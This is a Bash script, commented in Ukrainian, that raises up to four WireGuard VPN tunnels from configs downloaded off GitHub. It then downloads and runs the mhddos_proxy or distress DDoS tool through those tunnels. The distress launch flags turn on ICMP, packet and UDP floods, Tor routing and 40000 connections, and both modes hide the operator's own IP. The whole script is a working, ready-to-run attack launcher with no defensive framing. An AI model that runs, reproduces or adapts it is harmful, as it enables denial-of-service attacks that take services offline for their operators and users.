#!/bin/bash
set -e

# === КОНСТАНТИ ===
WG_REPO_RAW="https://raw.githubusercontent.com/k7771/Kaljan747/k7771/wg"
WG_DIR="$HOME/wg_confs"
LOG_DIR="$HOME/logs"
MODULE_DIR="$HOME/modules"
LOG_FILE="$LOG_DIR/wg.log"

mkdir -p "$WG_DIR" "$LOG_DIR" "$MODULE_DIR"
touch "$LOG_FILE"
SUDO=$(command -v sudo || echo "")

# === USER-ID ===
ask_user_id() {
    read -p "USER-ID (тільки цифри): " USER_ID
    [[ "$USER_ID" =~ ^[0-9]+$ ]] || { echo "❌ USER-ID недійсний"; exit 1; }
}

# === Запит параметрів запуску ===
ask_parameters() {
    echo "1) mhddos_proxy | 2) distress"
    read -p "Модуль (1/2): " mod_choice
    MODULE=$( [ "$mod_choice" = "1" ] && echo "mhddos_proxy" || echo "distress" )
    echo "1) Так | 2) Ні"
    read -p "Редагувати INI? (1/2): " edit_choice
    EDIT_INI=$( [ "$edit_choice" = "1" ] && echo "Так" || echo "Ні" )
    echo "1) screen у фоні | 2) screen відкрито | 3) без screen"
    read -p "Режим запуску (1/2/3): " run_choice
    case "$run_choice" in
        1) RUN_MODE="screen у фоні";;
        2) RUN_MODE="screen відкрито";;
        3) RUN_MODE="без screen";;
    esac
}

# === Завантаження WG-конфігів з GitHub ===
echo "[+] Завантаження WG-конфігів..."
for i in $(seq 1 50); do
  FILE="wg$i.conf"
  URL="$WG_REPO_RAW/$FILE"
  DEST="$WG_DIR/$FILE"
  if [ -f "$DEST" ]; then
    echo "[=] Вже існує: $FILE"
  else
    curl -fsSL "$URL" -o "$DEST" && echo "[+] Завантажено: $FILE" || echo "[-] Не знайдено: $FILE"
    chmod 600 "$DEST"
  fi
done

# === Зупинка активних WG ===
echo "[+] Зупинка активних WG..."
for iface in $(wg show interfaces 2>/dev/null); do
  echo "[-] Зупинка: $iface"
  $SUDO wg-quick down "$iface" 2>/dev/null || true
  $SUDO ip link delete "$iface" 2>/dev/null || true
done

# === Перевірка чи WG-тунель працює ===
check_wg() {
  curl -s --interface "$1" --max-time 5 https://api.ipify.org >/dev/null
}

# === Підняття до 4 робочих тунелів ===
WG_FILES=( $(find "$WG_DIR" -name "*.conf" | shuf) )
WG_IFACES=()
INDEX=0

while [ "${#WG_IFACES[@]}" -lt 4 ] && [ "$INDEX" -lt "${#WG_FILES[@]}" ]; do
  CONF="${WG_FILES[$INDEX]}"
  IFACE=$(basename "$CONF" .conf)
  $SUDO wg-quick up "$CONF" 2>/dev/null || true
  sleep 2
  if check_wg "$IFACE"; then
    echo "[+] Працює: $IFACE"
    WG_IFACES+=("$IFACE")
  else
    echo "[-] Не працює: $IFACE"
    $SUDO wg-quick down "$IFACE" 2>/dev/null || true
    $SUDO ip link delete "$IFACE" 2>/dev/null || true
  fi
  INDEX=$((INDEX+1))
done

[ "${#WG_IFACES[@]}" -eq 0 ] && echo "❌ Жоден WG не працює." && exit 1

VPN_LIST=$(IFS=' '; echo "${WG_IFACES[*]}")
VPN_COMMAS=$(IFS=','; echo "${WG_IFACES[*]}")

# === USER-ID + Параметри ===
ask_user_id
ask_parameters

# === Завантаження модуля + формування INI ===
if [ "$MODULE" = "mhddos_proxy" ]; then
  MODULE_BIN="$MODULE_DIR/mhddos_proxy"
  CONFIG_FILE="$MODULE_DIR/mhddos.ini"
  LINK="https://github.com/porthole-ascend-cinnamon/mhddos_proxy_releases/releases/latest/download/mhddos_proxy_linux"
  echo "--use-my-ip 0 --copies 4 -t 12000 --ifaces $VPN_LIST --user-id=$USER_ID" > "$CONFIG_FILE"
else
  MODULE_BIN="$MODULE_DIR/distress"
  CONFIG_FILE="$MODULE_DIR/distress.ini"
  LINK="https://github.com/Yneth/distress-releases/releases/latest/download/distress_x86_64-unknown-linux-musl"
  echo "--use-my-ip 0 --enable-icmp-flood --enable-packet-flood --direct-udp-mixed-flood --use-tor 30 -c 40000 --disable-auto-update --interface=$VPN_COMMAS --user-id=$USER_ID" > "$CONFIG_FILE"
fi

[ -f "$MODULE_BIN" ] || curl -fsSL "$LINK" -o "$MODULE_BIN"
chmod +x "$MODULE_BIN"

[ "$EDIT_INI" = "Так" ] && nano "$CONFIG_FILE"

ARGS=$(cat "$CONFIG_FILE")
if [ "$RUN_MODE" = "screen у фоні" ]; then
  screen -dmS "$MODULE" bash -c "$MODULE_BIN $ARGS"
elif [ "$RUN_MODE" = "screen відкрито" ]; then
  screen -S "$MODULE" bash -c "$MODULE_BIN $ARGS"
else
  bash -c "$MODULE_BIN $ARGS" &
fi

PID=$(pgrep -f "$MODULE_BIN")
echo "[✓] Запущено $MODULE (PID $PID)"
